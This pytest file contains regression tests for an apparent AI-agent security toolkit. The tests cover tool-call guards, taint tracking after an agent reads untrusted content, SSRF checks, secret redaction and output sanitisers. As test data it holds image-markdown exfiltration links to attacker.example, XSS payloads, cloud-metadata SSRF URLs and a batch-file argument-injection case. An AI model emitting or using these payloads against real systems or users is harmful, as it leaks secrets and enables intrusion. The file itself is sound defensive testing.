"""Regression tests for bypasses found in a security review of the toolkit itself.

Each test names the attack it closes. All of them fail against the code as it was before the
fixes: this file is the record that the controls actually hold.
"""

from __future__ import annotations

import html
import http.server
import json
import os
import sys
import threading
import time

import pytest

from agentsec.fuzzer import HttpTarget
from agentsec.fuzzer.harness import CaseResult, FuzzConfig
from agentsec.fuzzer.report import FuzzReport
from agentsec.middleware import (
    Action,
    AgentMiddleware,
    AuditLogger,
    DangerousContentValidator,
    ExfilLinkValidator,
    FileSink,
    InjectionScanner,
    JsonSchemaValidator,
    MemorySink,
    OutputGuard,
    ProtectedStringValidator,
    redact_text,
    verify_file,
    verify_records,
)
from agentsec.sandbox import (
    ExecRule,
    Policy,
    SafeCommandRunner,
    Session,
    ToolDenied,
    ToolGuard,
    run_anthropic_tool_uses,
)
from agentsec.sandbox.policy import ArgRule
from agentsec.sandbox.validators import check_arg, check_url
from agentsec.threatmodel import render_markdown, validate_system
from agentsec.types import AttackInput, ToolCall

# ---------------------------------------------------------------- numeric limits


@pytest.mark.parametrize("bad", [float("nan"), float("inf"), float("-inf")])
def test_non_finite_numbers_cannot_slip_past_min_max(bad):
    """NaN compares false to everything, so it used to pass every minimum/maximum check."""
    rule = ArgRule(type="number", minimum=0, maximum=100)
    assert check_arg(bad, rule)
    policy = Policy.from_dict(
        {
            "tools": {
                "pay": {"args": {"amount": {"type": "number", "required": True, "maximum": 100}}}
            }
        }
    )
    assert not ToolGuard(policy).evaluate(ToolCall("pay", {"amount": bad})).allowed


# ------------------------------------------------------------------ rate limits


def test_concurrent_calls_cannot_exceed_max_calls():
    """Check-then-increment was not atomic: 16 racing calls all passed a limit of 3."""
    guard = ToolGuard(Policy.from_dict({"tools": {"t": {"max_calls": 3}}}))
    original = guard.evaluate

    def slow(call, session=None):
        decision = original(call, session)
        time.sleep(0.02)  # widen the window between the check and the increment
        return decision

    guard.evaluate = slow  # type: ignore[method-assign]
    session = Session()
    barrier = threading.Barrier(16)
    results: list[bool] = []

    def worker():
        barrier.wait()
        results.append(guard.authorize(ToolCall("t", {}), session).allowed)

    threads = [threading.Thread(target=worker) for _ in range(16)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert sum(results) == 3 and session.calls["t"] == 3


def test_concurrent_calls_cannot_exceed_total_cap():
    guard = ToolGuard(Policy.from_dict({"max_total_calls": 2, "tools": {"a": {}, "b": {}}}))
    original = guard.evaluate
    guard.evaluate = lambda c, s=None: (time.sleep(0.02), original(c, s))[1]  # type: ignore[method-assign]
    session = Session()
    barrier = threading.Barrier(8)
    results: list[bool] = []

    def worker(name):
        barrier.wait()
        results.append(guard.authorize(ToolCall(name, {}), session).allowed)

    threads = [threading.Thread(target=worker, args=("a" if i % 2 else "b",)) for i in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert sum(results) == 2 and session.total_calls == 2


# --------------------------------------------------- authorize/execute consistency


def test_arguments_are_snapshotted_between_authorization_and_execution():
    """A caller (or another thread) holding the dict must not be able to swap it after approval."""
    policy = Policy.from_dict(
        {
            "tools": {
                "lookup": {
                    "require_approval": True,
                    "args": {"query": {"type": "string", "required": True, "pattern": "safe"}},
                }
            }
        }
    )
    original = {"query": "safe"}

    def approver(call, decision):
        original["query"] = "attacker-controlled"  # mutate after the policy check passed
        return True

    guard = ToolGuard(policy, approver=approver)
    seen = []
    guard.execute(ToolCall("lookup", original), lambda query: seen.append(query))
    assert seen == ["safe"]


def test_session_is_tainted_even_when_an_untrusted_tool_raises():
    policy = Policy.from_dict(
        {"tools": {"fetch": {"returns_untrusted": True}, "send": {"side_effects": True}}}
    )
    guard = ToolGuard(policy)
    session = Session()

    def boom():
        raise RuntimeError("fetched attacker content then failed")

    with pytest.raises(RuntimeError):
        guard.execute(ToolCall("fetch", {}), boom, session)
    assert session.tainted
    with pytest.raises(ToolDenied):
        guard.execute(ToolCall("send", {}), lambda: None, session)


def test_screen_input_taints_the_guards_default_session_when_none_is_passed():
    """Skipping taint silently left side-effecting tools open after reading attacker content."""
    guard = ToolGuard(Policy.from_dict({"tools": {"send": {"side_effects": True}}}))
    mw = AgentMiddleware(guard=guard)
    mw.screen_input("attacker document", source="web", untrusted=True)
    assert guard.default_session.tainted
    assert not guard.evaluate(ToolCall("send", {})).allowed


# -------------------------------------------------------------------------- SSRF


@pytest.mark.parametrize(
    "host",
    [
        "127.0.0.1.",  # trailing dot: not an IP literal to a strict parser, loopback to a resolver
        "169.254.169.254.",
        "１２７.0.0.1",  # fullwidth digits fold to 127.0.0.1 under IDNA
    ],
)
def test_ssrf_host_forms_that_normalise_to_private_addresses_are_blocked(host):
    rule = ArgRule(type="url", schemes=["https"], block_private=True)
    assert check_url(f"https://{host}/", rule)


def test_unparseable_hostname_is_rejected_not_waved_through():
    rule = ArgRule(type="url", schemes=["https"], block_private=True)
    # a non-ASCII name that IDNA cannot encode (empty label): no fetcher resolves it the way
    # we would, so refuse it rather than guess
    assert any("valid hostname" in e for e in check_url("https://é..example/", rule))


def test_allowlist_matches_on_the_normalised_host():
    rule = ArgRule(type="url", schemes=["https"], hosts=["api.corp.example"])
    assert not check_url("https://api.corp.example./x", rule)  # trailing dot is the same host


# ---------------------------------------------------------------- command runner


def test_command_output_is_bounded_while_running_not_after_the_fact(tmp_path):
    """capture_output buffered everything first; an endless writer ran until the timeout."""
    runner = SafeCommandRunner(
        {"py": ExecRule(executable=sys.executable)},
        cwd_roots=[str(tmp_path)],
        timeout=8,
        max_output_bytes=1000,
    )
    endless = tmp_path / "endless.py"
    endless.write_text(
        "import sys\nwhile True:\n    sys.stdout.write('x' * 4096)\n    sys.stdout.flush()\n"
    )
    started = time.monotonic()
    result = runner.run("py", [str(endless)])
    assert time.monotonic() - started < 6
    assert result.truncated and not result.timed_out
    assert len(result.stdout) == 1000


# --------------------------------------------------------------------- redaction


def _pem(kind: str = "PRIVATE KEY", body: str = "MIIEvQIBADANBgkqSECRETMATERIAL") -> str:
    # Assembled at runtime so this file never contains a contiguous key block.
    return "-----BEGIN " + kind + "-----\n" + body + "\n-----END " + kind + "-----"


@pytest.mark.parametrize("kind", ["PRIVATE KEY", "RSA PRIVATE KEY", "OPENSSH PRIVATE KEY"])
def test_private_key_body_is_redacted_not_just_the_header(kind):
    out, findings = redact_text("before\n" + _pem(kind) + "\nafter")
    assert "SECRETMATERIAL" not in out and "MIIEv" not in out
    assert "before" in out and "after" in out
    assert [f.kind for f in findings] == ["private_key_block"]


def test_pgp_private_key_block_and_unterminated_keys_are_redacted():
    pgp = (
        "-----BEGIN PGP "
        + "PRIVATE KEY BLOCK-----\nlQdGBFSECRETMATERIAL\n-----END PGP PRIVATE KEY BLOCK-----"
    )
    assert "SECRETMATERIAL" not in redact_text(pgp)[0]
    truncated = "-----BEGIN " + "PRIVATE KEY-----\nMIIEvQSECRETMATERIAL"  # output cut off mid-key
    assert "SECRETMATERIAL" not in redact_text("x " + truncated)[0]


# --------------------------------------------------------------- output validators


@pytest.mark.parametrize(
    "markup",
    [
        "![x](//attacker.example/p.png?d=SECRET)",
        "![x](\\\\attacker.example/p.png?d=SECRET)",
        '<img src="//attacker.example/p.png?d=SECRET">',
    ],
)
def test_network_path_reference_images_are_treated_as_external(markup):
    """A UI resolves //host against its own scheme and fetches it: zero-click exfiltration."""
    validator = ExfilLinkValidator(allowed_hosts=["ok.example"])
    assert validator.check(markup)
    assert "attacker.example" not in validator.sanitize(markup)


def test_network_path_reference_to_an_allowed_host_is_fine():
    assert not ExfilLinkValidator(allowed_hosts=["ok.example"]).check("![x](//ok.example/p.png)")


@pytest.mark.parametrize(
    "markup",
    [
        "![x](https://attacker.example\\@ok.example/p.png?d=SECRET)",
        '<img src="https://attacker.example\\@ok.example/p.png?d=SECRET">',
        # Browsers accept any number of slashes after http(s):; urlsplit finds no host.
        '<img src="https:/attacker.example/p.png?d=SECRET">',
        '<img src="https:///attacker.example/p.png?d=SECRET">',
        "![x](https:attacker.example/p.png?d=SECRET)",
        # A malformed bracketed host must be flagged, not crash the violation message.
        '<img src="https://attacker.example\\@[bad]/p.png">',
        '<img src="https://[bad]/p.png">',
    ],
)
def test_backslash_before_userinfo_cannot_disguise_the_real_host(markup):
    """urlsplit reads the host after '@', but browsers treat '\\' as '/' and fetch attacker."""
    validator = ExfilLinkValidator(allowed_hosts=["ok.example"])
    assert validator.check(markup)
    assert "attacker.example" not in validator.sanitize(markup)


def test_relative_path_argument_is_refused_because_the_tool_opens_it_against_cwd(tmp_path):
    """The guard used to resolve 'x' under the root, then the tool opened 'x' under cwd."""
    root = tmp_path / "ws"
    root.mkdir()
    policy = Policy.from_dict(
        {"tools": {"read_file": {"args": {"path": {"type": "path", "roots": [str(root)]}}}}}
    )
    guard = ToolGuard(policy)
    for value in ["secret.txt", "x/../secret.txt", "."]:
        with pytest.raises(ToolDenied):
            guard.execute(ToolCall("read_file", {"path": value}), lambda path: path)
    assert guard.execute(ToolCall("read_file", {"path": str(root / "a")}), lambda path: path)


@pytest.mark.skipif(sys.platform != "win32", reason="batch files only reparse args on Windows")
def test_runner_refuses_batch_files_whose_args_cmd_exe_would_reparse(tmp_path, monkeypatch):
    """BatBadBut: Popen(shell=False) still hands a .cmd to cmd.exe, so `x&ver` runs `ver`."""
    # With "." in PATHEXT, which() accepts "tool.cmd." and Windows then runs tool.cmd.
    monkeypatch.setenv("PATHEXT", os.environ.get("PATHEXT", ".COM;.EXE;.BAT;.CMD") + ";.")
    for ext in (".cmd", ".bat"):
        script = tmp_path / f"tool{ext}"
        script.write_text("@echo %*\n")
        for spelling in (str(script), str(script) + "."):
            with pytest.raises(ValueError, match="batch file"):
                SafeCommandRunner({"t": ExecRule(executable=spelling)}, cwd_roots=[str(tmp_path)])


@pytest.mark.parametrize(
    "markup",
    ["[x](java\tscript:alert(1))", "[x](java\nscript:alert(1))", "[x](vbscript:msgbox(1))"],
)
def test_script_urls_with_control_characters_inside_the_scheme_are_caught(markup):
    """Browsers drop tabs/newlines inside a URL scheme, so these execute."""
    assert DangerousContentValidator().check(markup)


def test_redact_mode_protected_string_removes_spaced_out_copies():
    """check() ignored whitespace but sanitize() did not: the secret shipped 'redacted'."""
    guard = OutputGuard([ProtectedStringValidator(["hunter2-secret"], action=Action.REDACT)])
    result = guard.process("the code is h u n t e r 2 - s e c r e t, ok")
    assert "hunter" not in result.text.replace(" ", "")
    assert "[REDACTED:protected]" in result.text


def test_output_guard_fails_closed_when_a_validator_cannot_sanitize_its_own_finding():
    guard = OutputGuard([JsonSchemaValidator({"type": "object"}, action=Action.REDACT)])
    result = guard.process("not json at all")
    assert not result.allowed and result.text == guard.blocked_message


# ------------------------------------------------------------------- adapters


def test_malformed_tool_input_is_refused_not_a_crash():
    """dict() on a non-object input raised and took down the whole agent loop."""
    guard = ToolGuard(Policy.from_dict({"tools": {"search": {}}}))
    blocks = [
        {"type": "tool_use", "id": "1", "name": "search", "input": ["not", "an", "object"]},
        {"type": "tool_use", "id": "2", "name": "search", "input": "a string"},
    ]
    out = run_anthropic_tool_uses(guard, Session(), blocks, {"search": lambda **_: "ok"})
    assert [o["is_error"] for o in out] == [True, True]
    assert all("object" in o["content"] for o in out)


def test_tool_exception_text_is_redacted_before_it_reaches_the_model():
    guard = ToolGuard(Policy.from_dict({"tools": {"db": {}}}))
    secret = "AKIA" + "ABCDEFGHIJKLMNOP"

    def boom():
        raise RuntimeError(f"connect failed using {secret}")

    out = run_anthropic_tool_uses(
        guard, Session(), [{"type": "tool_use", "id": "1", "name": "db", "input": {}}], {"db": boom}
    )
    assert out[0]["is_error"] and secret not in out[0]["content"]
    assert "RuntimeError" in out[0]["content"]


# --------------------------------------------------------------- threat-model doc


def test_threat_model_renderer_cannot_be_used_to_inject_markup():
    spec = validate_system(
        {
            "name": "S\n\n# INJECTED HEADING <img src=x onerror=alert(1)>",
            "owner": "a\n<script>alert(1)</script>",
            "description": "fine <b>bold</b>",
            "components": [
                {
                    "id": "a",
                    "type": "tool",
                    "name": 'x"] <img src=1 onerror=alert(1)>',
                    "trust_zone": "z | evil |\n| extra | row |",
                }
            ],
            "data_flows": [],
        }
    )
    md = render_markdown(spec)
    assert "<script>" not in md and "<img" not in md and "<b>" not in md
    assert not any(line.startswith("# INJECTED") for line in md.splitlines())
    # the components table row must still have exactly its 7 cells
    row = next(line for line in md.splitlines() if line.startswith("| a |"))
    assert row.replace("\\|", "").count("|") == 8


# ---------------------------------------------------------------- fuzz report


def test_fuzz_report_neutralises_target_controlled_evidence():
    """`evidence` quotes the system under test's output, which the attacker may have steered."""
    hostile = "x | y\n![leak](https://attacker.example/?d=1) <img src=z onerror=1> [a](https://b)"
    result = CaseResult(
        case_id="c1",
        payload_id="p",
        category="exfiltration",
        goal="exfil",
        mutator="none",
        scenario="direct",
        success=True,
        hits=["canary"],
        blocked=False,
        error=None,
        evidence=hostile,
        latency_ms=1.0,
    )
    md = FuzzReport.from_results([result], FuzzConfig()).to_markdown()
    assert "![leak]" not in md and "<img" not in md and "[a](" not in md
    row = next(line for line in md.splitlines() if line.startswith("| `c1`"))
    assert row.replace("\\|", "").count("|") == 4


# ---------------------------------------------------------------- HTTP target


class _Handler(http.server.BaseHTTPRequestHandler):
    hits: list[str] = []
    mode = "redirect"
    other_port = 0

    def do_POST(self):  # noqa: N802
        type(self).hits.append(self.path)
        length = int(self.headers.get("Content-Length", 0))
        self.rfile.read(length)
        if type(self).mode == "redirect":
            self.send_response(302)
            self.send_header("Location", f"http://127.0.0.1:{type(self).other_port}/elsewhere")
            self.end_headers()
            return
        body = json.dumps({"text": "x" * (6 * 1024 * 1024)}).encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def _serve(handler):
    server = http.server.HTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


def test_http_target_does_not_follow_redirects():
    other_hits: list[str] = []

    class Other(http.server.BaseHTTPRequestHandler):
        def do_POST(self):  # noqa: N802
            other_hits.append(self.path)
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    other, main = _serve(Other), None
    _Handler.hits, _Handler.mode, _Handler.other_port = [], "redirect", other.server_port
    try:
        main = _serve(_Handler)
        target = HttpTarget(f"http://127.0.0.1:{main.server_port}/chat", timeout=5)
        with pytest.raises(Exception, match="302"):
            target(AttackInput(user_message="hi"))
        assert other_hits == []  # the redirect target was never contacted
    finally:
        other.shutdown()
        if main:
            main.shutdown()


def test_http_target_caps_response_size():
    _Handler.hits, _Handler.mode = [], "big"
    server = _serve(_Handler)
    try:
        target = HttpTarget(f"http://127.0.0.1:{server.server_port}/chat", timeout=10)
        with pytest.raises(ValueError, match="exceeds"):
            target(AttackInput(user_message="hi"))
    finally:
        server.shutdown()


# --------------------------------------------------------------------- scan cost


def test_oversized_untrusted_input_is_visible_in_the_audit_log_not_scanned_in_full():
    """A huge tool result used to cost the scanner and redactor work proportional to its full
    size on every screen, with no ceiling and nothing recording that it happened."""
    sink = MemorySink()
    audit = AuditLogger(sink)
    mw = AgentMiddleware(guard=None, scanner=InjectionScanner(max_scan_chars=1000), audit=audit)
    mw.screen_input("x" * 5000, source="web", untrusted=True)
    findings = [r for r in sink.records if r["event"] == "injection_signal"]
    assert findings and findings[0]["data"]["truncated"] is True


# ---------------------------------------------------------------- SSRF address coverage


@pytest.mark.parametrize(
    "url",
    [
        "https://100.100.100.200/latest/meta-data/",  # Alibaba Cloud metadata (CGNAT space)
        "https://100.64.0.1/",
        "https://localhost/",
        "https://LOCALHOST./",
        "https://api.localhost/",
        "https://[::ffff:100.100.100.200]/",
    ],
)
def test_ssrf_check_rejects_cgnat_and_localhost_names_without_dns(url):
    """is_private misses 100.64.0.0/10; localhost names are loopback without any DNS lookup."""
    assert check_url(url, ArgRule(type="url"))


def test_ssrf_check_still_allows_public_hosts():
    assert not check_url("https://93.184.215.14/", ArgRule(type="url"))
    assert not check_url("https://notlocalhost.example/", ArgRule(type="url"))


# ---------------------------------------------------------------- redaction coverage


def _secret_body(n: int, alphabet: str = "aB3_-") -> str:
    return (alphabet * n)[:n]


@pytest.mark.parametrize(
    ("text", "secret"),
    [
        # Current OpenAI key formats contain "-" and "_".
        ("key " + "sk-" + "proj-" + _secret_body(48), "sk-" + "proj-" + _secret_body(48)),
        ("key " + "sk-" + "svcacct-" + _secret_body(40), "sk-" + "svcacct-" + _secret_body(40)),
        # STS / boto JSON field names carry no "aws" prefix.
        (
            '{"SecretAccessKey": "' + "wJalrXUtnFEMI/K7MDENG/bPxRfiCY" + "EXAMPLEKE" + '/"}',
            "wJalrXUtnFEMI/K7MDENG/bPxRfiCY" + "EXAMPLEKE" + "/",
        ),
        # A secret ending in "/" or "+" has no \b after it.
        (
            "aws_secret_access_key = " + "wJalrXUtnFEMI/K7MDENG/bPxRfiCY" + "EXAMPLEK+" + "+",
            "wJalrXUtnFEMI/K7MDENG/bPxRfiCY" + "EXAMPLEK+" + "+",
        ),
        ("postgres://app:" + "hunter2pass" + "@db.internal:5432/app", "hunter2pass"),
        ("DB_PASSWORD=" + "hunter2pass", "hunter2pass"),
        ('{"password": "' + "hunter2pass" + '"}', "hunter2pass"),
    ],
)
def test_redaction_covers_modern_key_formats_and_credentials(text, secret):
    redacted, findings = redact_text(text)
    assert findings
    assert secret not in redacted


# ---------------------------------------------------------------- XSS markup coverage


@pytest.mark.parametrize(
    "markup",
    [
        '<svg><animate onbegin=alert(1) attributeName="x" dur="1s">',
        "<body onpageshow=alert(1)>",
        "<svg/onload=alert(1)>",
        '<a href="&#106;avascript:alert(1)">x</a>',
        '<a href="java&#x09;script:alert(1)">x</a>',
        '<a href="&#x6A;&#x61;vascript&colon;alert(1)">x</a>',
    ],
)
def test_dangerous_content_catches_any_handler_and_entity_encoded_schemes(markup):
    validator = DangerousContentValidator()
    assert validator.check(markup)
    assert not validator.check(validator.sanitize(markup))


@pytest.mark.parametrize("prose", ["one = 1", "online = True", "set the only=flag option"])
def test_dangerous_content_ignores_on_words_outside_tags(prose):
    assert not DangerousContentValidator().check(prose)


# ---------------------------------------------------------------- audit chain robustness


def test_two_loggers_on_one_file_share_a_single_chain(tmp_path):
    """One logger per conversation on a shared file used to fork the chain."""
    path = tmp_path / "audit.jsonl"
    a = AuditLogger(FileSink(path), session_id="a")
    b = AuditLogger(FileSink(path), session_id="b")
    for i in range(3):
        a.log("prompt", n=i)
        b.log("prompt", n=i)
    result = verify_file(path)
    assert result.ok and result.records_checked == 6
    assert a.checkpoint()["hash"] == b.checkpoint()["hash"]


def test_torn_last_line_fails_closed_with_a_clear_error(tmp_path):
    path = tmp_path / "audit.jsonl"
    AuditLogger(FileSink(path)).log("prompt", text="hi")
    with path.open("a", encoding="utf-8") as fh:
        fh.write('{"seq": 1, "ha')  # crash mid-write
    with pytest.raises(ValueError, match="torn write"):
        AuditLogger(FileSink(path))


@pytest.mark.parametrize("line", ["1", "[]", '"x"', "null"])
def test_verify_reports_non_object_records_as_tampering(tmp_path, line):
    path = tmp_path / "audit.jsonl"
    AuditLogger(FileSink(path)).log("prompt", text="hi")
    with path.open("a", encoding="utf-8") as fh:
        fh.write(line + "\n")
    result = verify_file(path)
    assert not result.ok
    assert not verify_records([1]).ok  # type: ignore[list-item]


def test_verify_reports_invalid_utf8_as_tampering(tmp_path):
    path = tmp_path / "audit.jsonl"
    AuditLogger(FileSink(path)).log("prompt", text="hi")
    with path.open("ab") as fh:
        fh.write(b'{"seq": 1, "x": "\xff"}\n')
    assert not verify_file(path).ok


@pytest.mark.parametrize(
    "text",
    ["<a" * 100_000, "<a " + "on" * 100_000, "a." * 100_000, "password" * 25_000],
    ids=["open-tags", "on-run", "dotted-word", "password-run"],
)
def test_new_markup_and_credential_patterns_stay_linear(text):
    """Both used to retry from every '<' / '.', taking minutes on 200k characters."""
    start = time.perf_counter()
    DangerousContentValidator().sanitize(text)
    redact_text(text)
    assert time.perf_counter() - start < 2.0


# ---------------------------------------------------------------- review follow-ups


@pytest.mark.parametrize(
    "markup",
    [
        '<img title=">" src=x onerror=alert(1)>',  # quoted ">" does not end the tag
        "<img alt='>' src=x onerror=alert(1)>",
        '<img src="x"onerror=alert(1)>',  # handler right after a closing quote
    ],
)
def test_event_handler_after_a_quoted_gt_is_still_inside_the_tag(markup):
    guard = OutputGuard.default()
    result = guard.process(markup)
    assert not result.allowed


@pytest.mark.parametrize(
    "text",
    [
        "Use &lt;script&gt; to describe a script element.",
        '<span title="online=true">Status</span>',
        "<a title='onclick=x'>ok</a>",
    ],
)
def test_escaped_markup_and_handler_text_inside_attribute_values_are_not_blocked(text):
    assert OutputGuard.default().process(text).allowed


def test_sanitize_never_returns_decoded_markup_that_decodes_to_script_again():
    validator = DangerousContentValidator()
    once = validator.sanitize('<a href="&amp;#106;avascript:alert(1)">x</a>')
    # Browsers decode once: "&amp;#106;" shows as text, so nothing here is dangerous...
    assert not validator.check(once)
    encoded = '<a href="&#106;avascript:alert(1)">x</a>'
    cleaned = validator.sanitize(encoded)
    # ...and a real encoded scheme is neutralised without decoding the document.
    assert not validator.check(cleaned)
    assert "javascript:" not in html.unescape(cleaned).lower()


@pytest.mark.parametrize(
    ("text", "secret"),
    [
        ('{"password":"ab cd ef"}', "ab cd ef"),
        ("password='with \\'quote\\' inside'", "inside"),
        ("redis://:" + "hunter2pass" + "@localhost:6379/0", "hunter2pass"),
    ],
)
def test_redaction_handles_quoted_passwords_and_empty_usernames(text, secret):
    redacted, _ = redact_text(text)
    assert secret not in redacted


@pytest.mark.parametrize(
    "text",
    [
        "password=" + "hunter2pass",
        '{"password": "' + "hunter2pass" + '"}',
        "redis://user:" + "hunter2pass" + "@localhost/0",
    ],
)
def test_redaction_is_idempotent_so_the_guard_delivers_redacted_output(text):
    once, _ = redact_text(text)
    assert redact_text(once) == (once, [])
    result = OutputGuard.default().process(text)
    assert result.allowed and "hunter2pass" not in result.text


def test_ssrf_check_rejects_reserved_ipv6_on_every_python_version():
    assert check_url("https://[4000::1]/", ArgRule(type="url"))


def test_file_sink_path_is_fixed_at_construction(tmp_path, monkeypatch):
    first, second = tmp_path / "a", tmp_path / "b"
    first.mkdir()
    second.mkdir()
    monkeypatch.chdir(first)
    a = AuditLogger(FileSink("audit.jsonl"))
    monkeypatch.chdir(second)
    b = AuditLogger(FileSink("audit.jsonl"))
    a.log("prompt")
    b.log("prompt")
    assert verify_file(first / "audit.jsonl").ok and verify_file(second / "audit.jsonl").ok


@pytest.mark.parametrize(
    "tail",
    [
        None,  # valid record but no trailing newline
        '{"seq": 1, "hash": null}\n',
        '{"seq": "1", "hash": "' + "0" * 64 + '"}\n',
        '{"seq": 1, "hash": "' + "0" * 64 + '"}\n',  # well-formed but hash does not match
    ],
)
def test_resume_refuses_a_last_record_it_cannot_safely_chain_onto(tmp_path, tail):
    path = tmp_path / "audit.jsonl"
    AuditLogger(FileSink(path)).log("prompt", text="hi")
    if tail is None:
        path.write_text(path.read_text(encoding="utf-8").rstrip("\n"), encoding="utf-8")
    else:
        with path.open("a", encoding="utf-8") as fh:
            fh.write(tail)
    with pytest.raises(ValueError, match="torn write"):
        AuditLogger(FileSink(path))


def test_verify_rejects_raw_bytes_that_mimic_an_escaped_surrogate(tmp_path):
    path = tmp_path / "audit.jsonl"
    AuditLogger(FileSink(path)).log("prompt", text="\udcff")
    raw = path.read_bytes().replace(rb"\udcff", b"\xff")
    path.write_bytes(raw)
    assert not verify_file(path).ok
